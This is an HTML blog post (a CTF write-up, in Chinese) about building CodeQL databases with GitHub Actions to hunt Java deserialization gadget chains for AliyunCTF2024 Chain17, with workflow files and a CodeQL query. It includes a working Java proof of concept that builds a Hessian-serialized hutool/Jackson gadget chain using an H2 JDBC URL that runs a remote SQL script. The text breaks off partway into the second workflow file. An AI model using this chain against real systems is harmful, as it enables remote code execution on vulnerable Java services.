@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>利用Github Actions生成CodeQL数据库</title>
+    <meta name="description" content="">
+    <meta name="keywords" content='Hacking'>
+
+    <meta property="og:url" content="http://localhost:1313/posts/2024_fall/git-actions-codeql/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="利用Github Actions生成CodeQL数据库">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="/images/avatar.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="利用Github Actions生成CodeQL数据库">
+    <meta name="twitter:description" content="">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/2024_fall/git-actions-codeql/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/2024_fall/git-actions-codeql/">
+    <meta name="twitter:image" content="/images/avatar.png">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/2024_fall/git-actions-codeql/" />
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1313//css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="http://localhost:1313//css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="http://localhost:1313//css/dark.css">
+
+    <script src="http://localhost:1313//js/svg-injector.min.js"></script>
+    <script src="http://localhost:1313//js/feather-icons.min.js"></script>
+    <script src="http://localhost:1313//js/main.js"></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://localhost:1313/">
+                <img src="http://localhost:1313//images/avatar.png" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">BRIdGE&#39;s blog</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/contact/"> Contact </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/index.xml"> RSS </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/contact/"> Contact </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/index.xml"> RSS </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>利用Github Actions生成CodeQL数据库</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">
+            March 28, 2024
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="http://localhost:1313/tags/hacking">Hacking</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p><strong>利用Github Actions生成CodeQL数据库 &ndash; 以AliyunCTF2024 Chain17的反序列化链挖掘为例</strong></p>
+<h1 id="背景">背景</h1>
+<p><a href="https://github.blog/2022-08-15-the-next-step-for-lgtm-com-github-code-scanning/">lgtm</a>社区在2022年关闭后，CodeQL只能在本地手动构建，lgtm则被整合进了<a href="https://docs.github.com/en/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning">Github Code Scanning</a>中。</p>
+<p>可以在Github Action中使用<code>github/codeql-action</code>来用官方提供的queries对repository的代码进行扫描，结果会显示为Code Scanning Alerts。官方文档还提到，可以自定义QL语句。但是鄙人根据官方文档的配置尝试多次后并不认为可以自定义queries（（</p>
+<p>但是，可以结合<code>actions/upload-artifact</code>这个action将构建好的CodeQL数据库导出，然后在本地导入，本地查询。</p>
+<p>而CodeQL数据库的生成需要正确的编译。幸运的是，github code scanning为我们提供了自动识别编译脚本的功能。</p>
+<p>另外，Public repository的Actions是免费的，Private repository有免费额度。实战中我们fork官方的repository即可。</p>
+<h1 id="题目背景">题目背景</h1>
+<p>题目为两个部分，agent和server，都是old-fashion的反序列化入口。题目的流程不再赘述，可以移步<a href="https://xz.aliyun.com/t/14190">官方WP</a></p>
+<p>这里说一下思路</p>
+<h2 id="agent">agent</h2>
+<p>已知</p>
+<ul>
+<li>Hessian反序列化Map的时候会调用Map.put</li>
+<li>cn.hutool.json.JSONObject#put(&ldquo;foo&rdquo;, AtomicReference) -&gt; AtomicReference#toString，注意AtomicReference是JDK的内部类才能调用toString，否则会根据属性调用getter</li>
+<li>POJONode.toString -&gt; Bean.getObject</li>
+<li>Bean.getObject返回object后，jackson会调用object的所有getter（根据getter名字）</li>
+</ul>
+<p>所以就需要找一条getter2RCE的链子并绕过黑名单。给了h2依赖，容易想到<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">JDBC Connection URL Attack | 素十八 (su18.org)</a></p>
+<p>也就是需要寻找hutool库中getter -&gt; DriverManager.getConnection的链子</p>
+<h2 id="server">server</h2>
+<p>已知</p>
+<ul>
+<li>XString#toString -&gt; POJONode#toString -&gt; getter</li>
+</ul>
+<p>需要找jOOQ库中getter -&gt; RCE的链子</p>
+<h1 id="hacking-with-github-actions">Hacking With Github Actions</h1>
+<h2 id="agent-1">agent</h2>
+<h3 id="云编译">云编译</h3>
+<p>fork仓库<a href="https://github.com/dromara/hutool">dromara/hutool: 🍬A set of tools that keep Java sweet. (github.com)</a></p>
+<p>Actions中选择codeql</p>
+<p><img src="
+        /posts/2024_fall/assets/2662112-20240328002136137-1014570136.png" alt="image"/></p>
+<p>修改一下<code>.github/workflows/codeql.yml</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#6272a4"># For most projects, this workflow file will not need changing; you simply need</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># to commit it to your repository.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># You may wish to alter this file to override the set of languages analyzed,</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># or to provide custom queries or build logic.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ******** NOTE ********</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># We have attempted to detect the languages in your repository. Please check</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># the `language` matrix defined below to confirm you have the correct set of</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># supported CodeQL languages.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">name</span>: <span style="color:#f1fa8c">&#34;CodeQL&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">on</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">push</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">branches</span>: [ <span style="color:#f1fa8c">&#34;v5-master&#34;</span> ]
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">pull_request</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">branches</span>: [ <span style="color:#f1fa8c">&#34;v5-master&#34;</span> ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">jobs</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">analyze</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">name</span>: Analyze (${{ matrix.language }})
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Runner size impacts CodeQL analysis time. To learn more, please see:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/recommended-hardware-resources-for-running-codeql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/supported-runners-and-hardware-resources</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/using-larger-runners</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Consider using larger runners for possible analysis time improvements.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">runs-on</span>: ${{ (matrix.language == &#39;swift&#39; &amp;&amp; &#39;macos-latest&#39;) || &#39;ubuntu-latest&#39; }}
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">timeout-minutes</span>: ${{ (matrix.language == &#39;swift&#39; &amp;&amp; 120) || 360 }}
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">permissions</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4"># required for all workflows</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">security-events</span>: write
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4"># only required for workflows in private repositories</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">actions</span>: read
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">contents</span>: read
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">strategy</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">fail-fast</span>: <span style="color:#ff79c6">false</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">matrix</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">include</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ff79c6">language</span>: java-kotlin
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">build-mode</span>: none <span style="color:#6272a4"># This mode only analyzes Java. Set this to &#39;autobuild&#39; or &#39;manual&#39; to analyze Kotlin too.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># CodeQL supports the following values keywords for &#39;language&#39;: &#39;c-cpp&#39;, &#39;csharp&#39;, &#39;go&#39;, &#39;java-kotlin&#39;, &#39;javascript-typescript&#39;, &#39;python&#39;, &#39;ruby&#39;, &#39;swift&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use `c-cpp` to analyze code written in C, C++ or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use &#39;java-kotlin&#39; to analyze code written in Java, Kotlin or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Use &#39;javascript-typescript&#39; to analyze code written in JavaScript, TypeScript or both</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># To learn more about changing the languages that are analyzed or customizing the build mode for your analysis,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If you are analyzing a compiled language, you can modify the &#39;build-mode&#39; for that language to customize how</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># your codebase is analyzed, see https://docs.github.com/en/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">steps</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Checkout repository
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: actions/checkout@v4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Initializes the CodeQL tools for scanning.</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">uses</span>: github/codeql-action/init@v3
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">languages</span>: ${{ matrix.language }}
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">build-mode</span>: ${{ matrix.build-mode }}
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># If you wish to specify custom queries, you can do so here or in a config file.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># By default, queries listed here will override any specified in a config file.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prefix the list here with &#34;+&#34; to use these queries and those in the config file.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># For more details on CodeQL&#39;s query packs, refer to: https://docs.github.com/en/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/configuring-code-scanning#using-queries-in-ql-packs</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># queries: security-extended,security-and-quality</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># If the analyze step fails for one of the languages you are analyzing with</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># &#34;We were unable to automatically build your code&#34;, modify the matrix above</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># to set the build mode to &#34;manual&#34; for that language. Then modify this step</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># to build your code.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># ℹ️ Command-line programs to run using the OS shell.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 📚 See https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">if</span>: matrix.build-mode == &#39;manual&#39;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">run</span>: |<span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;If you are using a &#34;manual&#34; build mode for one or more of the&#39; \
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">          &#39;languages you are analyzing, replace this with the commands to build&#39; \
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">          &#39;your code, for example:&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;  make bootstrap&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        echo &#39;  make release&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        exit 1</span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Perform CodeQL Analysis
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: github/codeql-action/analyze@v3
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">category</span>: <span style="color:#f1fa8c">&#34;/language:${{matrix.language}}&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ff79c6">name</span>: Upload CodeQL database as artifact
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">uses</span>: actions/upload-artifact@v4
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">with</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">name</span>: hutool-code-database
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">path</span>: /home/runner/work/_temp/codeql_databases/
+</span></span></code></pre></div><p>运行完毕后就能得到数据库文件</p>
+<p><img src="
+        /posts/2024_fall/assets/2662112-20240328002039756-891669769.png" alt="image"/></p>
+<h3 id="利用链">利用链</h3>
+<p>codeql导入后用这个ql</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * @kind path-problem
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> semmle.code.java.dataflow.FlowSources
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> semmle.code.java.dataflow.DataFlow
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Getter</span> <span style="color:#8be9fd;font-style:italic">extends</span> Method {
+</span></span><span style="display:flex;"><span>  Getter() { <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getName</span>().<span style="color:#50fa7b">regexpMatch</span>(<span style="color:#f1fa8c">&#34;get.+&#34;</span>) }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Source</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  Source() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span> <span style="color:#ff79c6">instanceof</span> Getter and <span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getASupertype</span><span style="color:#ff79c6">*</span>() <span style="color:#ff79c6">instanceof</span> TypeSerializable
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">GetConnectionMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Method {
+</span></span><span style="display:flex;"><span>  GetConnectionMethod() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">hasName</span>(<span style="color:#f1fa8c">&#34;getConnection&#34;</span>) and
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">hasQualifiedName</span>(<span style="color:#f1fa8c">&#34;java.sql&#34;</span>, <span style="color:#f1fa8c">&#34;DriverManager&#34;</span>)
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">DangerousMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  DangerousMethod() { <span style="color:#ff79c6">this</span> <span style="color:#ff79c6">instanceof</span> GetConnectionMethod }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">CallsDangerousMethod</span> <span style="color:#8be9fd;font-style:italic">extends</span> Callable {
+</span></span><span style="display:flex;"><span>  CallsDangerousMethod() {
+</span></span><span style="display:flex;"><span>    exists(Callable a <span style="color:#ff79c6">|</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">polyCalls</span>(a) and
+</span></span><span style="display:flex;"><span>      a <span style="color:#ff79c6">instanceof</span> DangerousMethod
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>query predicate <span style="color:#50fa7b">edges</span>(Callable a, Callable b) {
+</span></span><span style="display:flex;"><span>  a.<span style="color:#50fa7b">polyCalls</span>(b)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from Source source, CallsDangerousMethod sink
+</span></span><span style="display:flex;"><span>where edges<span style="color:#ff79c6">+</span>(source, sink)
+</span></span><span style="display:flex;"><span>select source, source, sink, <span style="color:#f1fa8c">&#34;$@ $@ to $@ $@&#34;</span>, source.<span style="color:#50fa7b">getDeclaringType</span>(),
+</span></span><span style="display:flex;"><span>  source.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getName</span>(), source, source.<span style="color:#50fa7b">getName</span>(), sink.<span style="color:#50fa7b">getDeclaringType</span>(),
+</span></span><span style="display:flex;"><span>  sink.<span style="color:#50fa7b">getDeclaringType</span>().<span style="color:#50fa7b">getName</span>(), sink, sink.<span style="color:#50fa7b">getName</span>()
+</span></span></code></pre></div><p>可能会有点误报，但是sink是准的</p>
+<p><img src="
+        /posts/2024_fall/assets/2662112-20240328002053597-1882344243.png" alt="image"/></p>
+<p>PooledDSFactory#getDataSource -&gt; PooledConnection#init -&gt; DriverManager.getConnection</p>
+<h3 id="poc">POC</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">final</span> String JDBC_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:8000/poc.sql&#39;&#34;</span>;  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Setting setting <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Setting();  
+</span></span><span style="display:flex;"><span>setting.<span style="color:#50fa7b">set</span>(<span style="color:#f1fa8c">&#34;url&#34;</span>, JDBC_URL);  
+</span></span><span style="display:flex;"><span>setting.<span style="color:#50fa7b">set</span>(<span style="color:#f1fa8c">&#34;initialSize&#34;</span>, <span style="color:#f1fa8c">&#34;1&#34;</span>);  
+</span></span><span style="display:flex;"><span>setting.<span style="color:#50fa7b">setCharset</span>(<span style="color:#ff79c6">null</span>);  
+</span></span><span style="display:flex;"><span>PooledDSFactory factory <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> PooledDSFactory(setting);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Bean bean <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Bean();  
+</span></span><span style="display:flex;"><span>bean.<span style="color:#50fa7b">setData</span>(ReflectUtils.<span style="color:#50fa7b">serialize</span>(factory));  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ClassPool classPool <span style="color:#ff79c6">=</span> ClassPool.<span style="color:#50fa7b">getDefault</span>();  
+</span></span><span style="display:flex;"><span>CtClass ctClass <span style="color:#ff79c6">=</span> classPool.<span style="color:#50fa7b">get</span>(<span style="color:#f1fa8c">&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span>);  
+</span></span><span style="display:flex;"><span>CtMethod ctMethod <span style="color:#ff79c6">=</span> ctClass.<span style="color:#50fa7b">getDeclaredMethod</span>(<span style="color:#f1fa8c">&#34;writeReplace&#34;</span>);  
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#50fa7b">removeMethod</span>(ctMethod);  
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#50fa7b">toClass</span>();  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>POJONode node <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> POJONode(bean);  
+</span></span><span style="display:flex;"><span>AtomicReference atomicReference <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> AtomicReference<span style="color:#ff79c6">&lt;&gt;</span>(node);  
+</span></span><span style="display:flex;"><span>JSONObject json <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> JSONObject();  
+</span></span><span style="display:flex;"><span>json.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;1&#34;</span>, <span style="color:#f1fa8c">&#34;2&#34;</span>);  
+</span></span><span style="display:flex;"><span>LinkedHashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> LinkedHashMap();  
+</span></span><span style="display:flex;"><span>map.<span style="color:#50fa7b">put</span>(<span style="color:#f1fa8c">&#34;1&#34;</span>, atomicReference);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ReflectUtils.<span style="color:#50fa7b">setFieldValue</span>(json, <span style="color:#f1fa8c">&#34;raw&#34;</span>, map);  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ByteArrayOutputStream byteArrayOutputStream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream();  
+</span></span><span style="display:flex;"><span>Hessian2Output hessian2Output <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Hessian2Output(byteArrayOutputStream);  
+</span></span><span style="display:flex;"><span>hessian2Output.<span style="color:#50fa7b">writeObject</span>(json);  
+</span></span><span style="display:flex;"><span>hessian2Output.<span style="color:#50fa7b">close</span>();  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> data <span style="color:#ff79c6">=</span> byteArrayOutputStream.<span style="color:#50fa7b">toByteArray</span>();  
+</span></span><span style="display:flex;"><span>System.<span style="color:#50fa7b">out</span>.<span style="color:#50fa7b">println</span>(Base64.<span style="color:#50fa7b">getEncoder</span>().<span style="color:#50fa7b">encodeToString</span>(data));
+</span></span></code></pre></div><h2 id="server-1">server</h2>
+<p>比赛的时候就止步于此了（（</p>
+<h3 id="云编译-1">云编译</h3>
+<p>同样给出codeql.yml，这里设置了jdk版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#6272a4"># For most projects, this workflow file will not need changing; you simply need</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># to commit it to your repository.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># You may wish to alter this file to override the set of languages analyzed,</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># or to provide custom queries or build logic.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ******** NOTE ********</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># We have attempted to detect the languages in your repository. Please check</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># the `language` matrix defined below to confirm you have the correct set of</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># supported CodeQL languages.</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">name</span>: <span style="color:#f1fa8c">&#34;CodeQL&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">on</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">push</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">branches</span>: [ <span style="color:#f1fa8c">&#34;main&#34;</span> ]
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">pull_request</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">branches</span>: [ <span style="color:#f1fa8c">&#34;main&#34;</span> ]
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">jobs</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">analyze</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">name</span>: Analyze (${{ matrix.language }})
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Runner size impacts CodeQL analysis time. To learn more, please see:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/recommended-hardware-resources-for-running-codeql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/supported-runners-and-hardware-resources</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#   - https://gh.io/using-larger-runners</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Consider using larger runners for possible analysis time improvements.</span>
